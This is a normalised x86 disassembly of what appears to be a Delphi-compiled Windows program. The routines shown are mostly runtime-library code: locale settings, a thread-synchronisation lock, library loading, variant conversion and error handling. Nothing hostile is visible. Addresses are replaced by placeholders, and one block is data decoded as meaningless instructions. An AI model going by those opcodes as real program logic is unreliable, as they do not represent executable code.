mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c3a4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c66f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c230
call sub_40ac20
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ab70
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f08
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407f60
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407f60
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40abbc
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40abbc
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407f60
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40abbc
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40aea8
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f08
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40aea8
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f08
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40abbc
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ab70
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f08
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ab70
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f08
lea eax [ ebp - 0x8 ]
call sub_403eb4
lea eax [ ebp - 0xc ]
call sub_403eb4
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407f60
test eax eax
jne r-xdata
call sub_40adf8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404234
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404234
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40abbc
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c676
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403ed8
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407f60
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ab70
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407f60
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f4c
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f4c
jmp r-xdata
sub_40c724
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c7b4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ab24
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c7bb
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
sub_40c80c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_40835c
mov [ rw-data ] eax
sub_40c890
push ebx
push esi
push edi
push ebp
call sub_40346c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4030e8
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_40c8f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c8e0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c980
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407914
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c880
mov [ ebp ] eax
sub_40c980
push ebx
mov ebx eax
mov eax ebx
call sub_40c8e0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c880
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40c9c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_40ca34
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_40cac0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4030f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_40cac0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ca7c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c8f8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c888
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c868
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c888
test eax eax
je r-xdata
mov eax edi
call sub_40ca7c
test bl bl
je r-xdata
mov eax edi
call sub_40cab0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c868
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c874
sub_40cb5c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8f8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c888
mov eax ebx
call sub_40ca94
mov eax ebx
call sub_40ca88
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c970
sub_40cbac
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c8f8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40caa0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c874
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c868
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40caa0
mov eax esi
call sub_40ca94
sub_40cc18
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8f8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c970
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c868
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ca94
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ca94
sub_40cc90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40ccb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cd2b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054f0
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031ac
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd32
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031ac
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cc90
test al al
jne r-xdata
mov al 0x1
sub_40cd4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cdbe
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cda0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404374
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cda7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40cdd0
sbb eax 0x4000000
add [ esi ] 0xffffff8c
cdq
inc esi
add ah bh
add [ esi ] 0x1c
cwde
inc esi
add ah dh
add [ esi ] 0xa0
xchg ebp eax
inc esi
add ah ch
add [ esi ] 0x0
0x82e40046 0x46
push esp
0x82dc0046 0x46
les edx [ esi - 0x7d2bffba ]
inc esi
add ah bh
xchg edi eax
inc esi
add ah cl
add [ esi ] 0x48
xchg ebp eax
inc esi
add ah al
add [ esi ] 0x74
cwde
inc esi
add [ edx + eax * 4 - 0x671bffba ] bh
inc esi
add [ edx + eax * 4 - 0x6847ffba ] dh
inc esi
add [ edx + eax * 4 - 0x683bffba ] ch
inc esi
add [ edx + eax * 4 - 0x650bffba ] ah
inc esi
add [ edx + eax * 4 - 0x683fffba ] bl
inc esi
add [ edx + eax * 4 - 0x645bffba ] dl
inc esi
add [ edx + eax * 4 - 0x66bbffba ] cl
inc esi
add [ edx + eax * 4 - 0x66ebffba ] al
inc esi
add [ edx + eax * 4 + 0x46 ] bh
add [ ebx + ebx * 4 - 0x7d8bffba ] bh
inc esi
add [ eax - 0x65 ] cl
inc esi
add [ edx + eax * 4 + 0x46 ] ch
add al bl
xchg edi eax
inc esi
add [ edx + eax * 4 + 0x46 ] ah
add ah bh
0x825c0046 0x46
adc al 0x9b
inc esi
add [ edx + eax * 4 + 0x46 ] dl
add [ eax + 0x4c004696 ] ch
add [ esi ] 0x34
xchg esi eax
inc esi
add [ edx + eax * 4 + 0x46 ] al
add [ ecx + ebx * 4 ] al
inc esi
add [ edx + eax * 4 ] bh
inc esi
add ah dh
cdq
inc esi
add [ edx + eax * 4 ] dh
inc esi
add [ ebp + edx * 4 + 0x46 ] dl
add [ edx + eax * 4 ] ch
inc esi
add al dh
0x82240046 0x46
rcl [ edi + 0x280046 ] 0x1
add [ eax ] al
sbb al 0x82
inc esi
add al dl
0x46 0x0
sub_40cf12
add [ eax ] al
add [ edx - 0x6833ffba ] al
inc esi
add [ eax ] al
add [ eax ] al
add ah bh
add [ esi ] rw-data
add [ eax ] al
add [ eax ] al
clc
add [ esi ] rw-data
add [ eax ] al
add [ eax ] al
hlt
sub_40d220
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d288
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d28f
retn
mov eax sub_40cdd0
call sub_403bdc
mov eax r-xdata
call sub_403c04
cmp [ rw-data ] 0x0
je r-xdata
call sub_40b9e8
call sub_40baec
call sub_40c80c
call sub_40c3a4
mov eax rw-data
mov edx r-xdata
call sub_403f08
sub_40d2c0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d314
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d36e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407f78
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d375
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d380
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d3da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409280
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3e1
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d3ec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d446
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409254
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d44d
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d458
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d4b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40aa98
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4b9
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d4c4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d51e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4092ac
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d525
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d530
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d59d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40413c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408064
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5a4
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_40d5b0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d610
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409208
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046e0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d617
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d620
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d680
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a258
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046e0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d687
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d690
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d6f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408100
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4046e0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6fb
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40d724
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d750
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d2c0
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2f0
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2f0
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2fc
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d308
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d314
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d380
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3ec
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d458
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4c4
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d530
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d5b0
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d620
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d690
mov eax r-xdata
call sub_40d724
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40da5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40da81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da88
retn
sub_40e074
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e0be
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0c5
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40e0c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e157
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fdb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fdb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e15e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed8
retn
sub_40e164
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e1ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1b5
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40e1b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e247
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fdb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fdb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e24e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed8
retn
sub_40e254
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e29e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2a5
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40e2a8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e4ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
